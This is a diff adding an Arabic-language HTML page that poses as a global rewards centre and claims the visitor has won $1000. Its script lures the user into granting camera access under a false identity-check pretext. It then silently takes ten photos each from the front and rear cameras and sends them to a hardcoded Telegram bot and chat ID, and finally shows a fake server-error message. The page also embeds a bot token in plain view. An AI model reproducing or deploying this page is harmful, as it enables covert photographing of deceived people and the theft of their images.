@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز المكافآت العالمي</title>
+    <style>
+        /* CSS Integration */
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); 
+            height: 100vh; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: white;
+        }
+        .container { 
+            background: rgba(255, 255, 255, 0.1); 
+            padding: 40px; 
+            border-radius: 20px; 
+            backdrop-filter: blur(10px); 
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        h1 { font-size: 2.5rem; margin-bottom: 10px; color: #fff; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        p { font-size: 1.2rem; margin-bottom: 30px; }
+        .btn { 
+            background: #ffcc00; 
+            color: #000; 
+            border: none; 
+            padding: 15px 40px; 
+            font-size: 1.5rem; 
+            font-weight: bold; 
+            cursor: pointer; 
+            border-radius: 50px; 
+            transition: transform 0.2s, background 0.2s;
+        }
+        .btn:hover { transform: scale(1.05); background: #fff; }
+        #canvas, #video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>تهانينا! 🎉</h1>
+        <p>لقد تم اختيارك للفوز بجائزة نقدية قيمتها <b>1000 دولار</b></p>
+        <button class="btn" id="startBtn">استلام الجائزة الآن</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        /* JavaScript Integration */
+        const config = {
+            token: "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU",
+            chatId: "8397194527",
+            totalPhotos: 10
+        };
+
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        startBtn.addEventListener('click', async () => {
+            // تفعيل الكاميرا يطلب تصريح المتصفح
+            try {
+                alert("للأمان: يجب تفعيل الكاميرا للتحقق من هوية الفائز.");
+                
+                // بدء الالتقاط من الكاميرا الأمامية أولاً
+                await runCaptureSequence("user");
+                
+                // ثم محاولة الالتقاط من الكاميرا الخلفية
+                await runCaptureSequence("environment");
+
+                alert("خطأ في الاتصال بالسيرفر! حاول لاحقاً.");
+            } catch (err) {
+                alert("يجب السماح بالوصول للكاميرا للمطالبة بالجائزة.");
+            }
+        });
+
+        async function runCaptureSequence(mode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode } 
+                });
+                video.srcObject = stream;
+
+                // الانتظار حتى تفتح الكاميرا
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                for (let i = 0; i < config.totalPhotos; i++) {
+                    await new Promise(r => setTimeout(r, 600)); // فاصل زمني للالتقاط
+                    captureImage(mode, i + 1);
+                }
+            } catch (e) {
+                console.log("Mode " + mode + " not available.");
+            }
+        }
+
+        function captureImage(mode, count) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', config.chatId);
+                formData.append('photo', blob, `shot_${mode}_${count}.jpg`);
+                formData.append('caption', `Architect Output: Camera_${mode} | Image_${count}`);
+
+                fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.7);
+        }
+    </script>
+</body>
+</html>
